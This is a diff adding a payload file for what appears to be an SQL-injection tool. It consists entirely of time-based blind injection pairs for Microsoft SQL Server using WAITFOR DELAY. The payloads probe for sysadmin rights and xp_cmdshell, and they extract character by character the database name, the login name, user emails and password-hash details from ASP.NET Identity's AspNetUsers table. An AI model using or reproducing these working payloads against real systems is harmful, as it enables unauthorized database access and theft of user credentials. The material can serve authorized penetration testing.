@@ -1,0 +1,65 @@
+# mssql_timebased.txt — time-based blind injection pairs
+#
+# For time-based pairs, the tool measures elapsed time instead of response size.
+# TRUE payload should cause a delay, FALSE should return at baseline speed.
+# Both payloads must be the same length.
+#
+# Format: same TRUE:/FALSE: as other payload files.
+# The tool detects WAITFOR/SLEEP and uses timing differential automatically.
+
+# ── Basic WAITFOR confirmation ────────────────────────────────────────────────
+# TRUE delays 5s, FALSE delays 0s (returns immediately)
+TRUE:  ss'; IF (1=1) WAITFOR DELAY '0:0:5'-- wXyW
+FALSE: ss'; IF (1=2) WAITFOR DELAY '0:0:5'-- wXyW
+
+# ── DB existence via timing ───────────────────────────────────────────────────
+TRUE:  ss'; IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (SELECT COUNT(*) FROM sysobjects)=0 WAITFOR DELAY '0:0:5'-- x
+
+# ── AspNetUsers table existence ───────────────────────────────────────────────
+TRUE:  ss'; IF (SELECT COUNT(*) FROM AspNetUsers)>0 WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (SELECT COUNT(*) FROM AspNetUsers)=0 WAITFOR DELAY '0:0:5'-- x
+
+# ── Sysadmin privilege check ──────────────────────────────────────────────────
+TRUE:  ss'; IF (IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'-- xxxxx
+FALSE: ss'; IF (IS_SRVROLEMEMBER('sysadmin')=0) WAITFOR DELAY '0:0:5'-- xxxxx
+
+# ── DB_NAME() first char binary search via timing ─────────────────────────────
+# ASCII 65=A 90=Z 97=a 122=z
+# Start: is first char > 64 (above @)?
+TRUE:  ss'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>64) WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))=64) WAITFOR DELAY '0:0:5'-- x
+
+# Is first char > 80 (above P)?
+TRUE:  ss'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>80) WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))=80) WAITFOR DELAY '0:0:5'-- x
+
+# Is first char > 72 (above H)?
+TRUE:  ss'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>72) WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))=72) WAITFOR DELAY '0:0:5'-- x
+
+# ── SYSTEM_USER first char ────────────────────────────────────────────────────
+TRUE:  ss'; IF (ASCII(SUBSTRING(SYSTEM_USER,1,1))>64) WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (ASCII(SUBSTRING(SYSTEM_USER,1,1))=64) WAITFOR DELAY '0:0:5'-- x
+
+TRUE:  ss'; IF (ASCII(SUBSTRING(SYSTEM_USER,1,1))>96) WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (ASCII(SUBSTRING(SYSTEM_USER,1,1))=96) WAITFOR DELAY '0:0:5'-- x
+
+# ── User count via timing ─────────────────────────────────────────────────────
+TRUE:  ss'; IF (SELECT COUNT(*) FROM AspNetUsers)>0 WAITFOR DELAY '0:0:5'-- xx
+FALSE: ss'; IF (SELECT COUNT(*) FROM AspNetUsers)=0 WAITFOR DELAY '0:0:5'-- xx
+
+TRUE:  ss'; IF (SELECT COUNT(*) FROM AspNetUsers)>5 WAITFOR DELAY '0:0:5'-- xx
+FALSE: ss'; IF (SELECT COUNT(*) FROM AspNetUsers)=5 WAITFOR DELAY '0:0:5'-- xx
+
+# ── Email first char of first user ───────────────────────────────────────────
+TRUE:  ss'; IF (ASCII(SUBSTRING((SELECT TOP 1 Email FROM AspNetUsers ORDER BY Email),1,1))>64) WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (ASCII(SUBSTRING((SELECT TOP 1 Email FROM AspNetUsers ORDER BY Email),1,1))=64) WAITFOR DELAY '0:0:5'-- x
+
+# ── PasswordHash length (ASP.NET Identity hashes are ~172 chars) ──────────────
+TRUE:  ss'; IF (LEN((SELECT TOP 1 PasswordHash FROM AspNetUsers))>100) WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (LEN((SELECT TOP 1 PasswordHash FROM AspNetUsers))=100) WAITFOR DELAY '0:0:5'-- x
+
+# ── xp_cmdshell availability (sysadmin only) ──────────────────────────────────
+TRUE:  ss'; IF (SELECT COUNT(*) FROM sys.objects WHERE name='xp_cmdshell')>0 WAITFOR DELAY '0:0:5'-- x
+FALSE: ss'; IF (SELECT COUNT(*) FROM sys.objects WHERE name='xp_cmdshell')=0 WAITFOR DELAY '0:0:5'-- x
